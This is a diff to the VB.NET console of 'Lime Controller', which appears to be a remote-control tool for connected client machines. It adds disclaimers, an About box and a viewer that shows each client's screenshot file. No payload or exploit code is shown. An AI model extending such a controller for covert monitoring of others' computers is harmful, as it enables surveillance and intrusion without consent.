@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##           N Y A N   C A T  ||  Last edit MAR./14/2018        ##
+'##        N Y A N   C A T  |||   Updated on MAR./15/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -25,6 +25,12 @@
 '##                                                              ##
 '##################################################################
 '##    This project was created for educational purposes only    ##
+'##################################################################
+'##       https://github.com/NYAN-x-CAT/Lime-Controller/         ##
+'##################################################################
+'##  This software's main purpose is NOT to be used maliciously  ##
+'##################################################################
+'## I am not responsible For any actions caused by this software ##
 '##################################################################
 
 
@@ -313,6 +319,7 @@ Public Class Form1
     Private Sub Form1_Resize(sender As Object, e As EventArgs) Handles Me.Resize
         On Error Resume Next
         Fix()
+        PictureBox1.Anchor = (AnchorStyles.Bottom + AnchorStyles.Right)
     End Sub
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
@@ -335,6 +342,20 @@ Public Class Form1
         End Try
     End Function
 
+    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
+        Try
+            If L1.SelectedItems.Count > 0 Then
+                For Each x As ListViewItem In L1.SelectedItems
+                    PictureBox1.ImageLocation = "Users" + "\" + x.SubItems(2).Text + "_" + x.SubItems(0).Text + "\" + "SC.jpeg"
+                    PictureBox1.Visible = True
+                Next
+            Else
+                PictureBox1.Visible = False
+            End If
+        Catch ex As Exception
+            PictureBox1.Visible = False
+        End Try
+    End Sub
 
     Private Sub L1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
         Using br = New Drawing.SolidBrush(Drawing.Color.Black)
@@ -468,6 +489,12 @@ Public Class Form1
             S.Send(x.Tag, "Details")
         Next
     End Sub
+
+    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
+        MsgBox("Coded by NYAN CAT" + vbNewLine + vbNewLine + "r3vo@protonmail.com" + vbNewLine, MsgBoxStyle.Information, Title:=" Lime Controller | About ")
+    End Sub
+
+
 
 
 #End Region
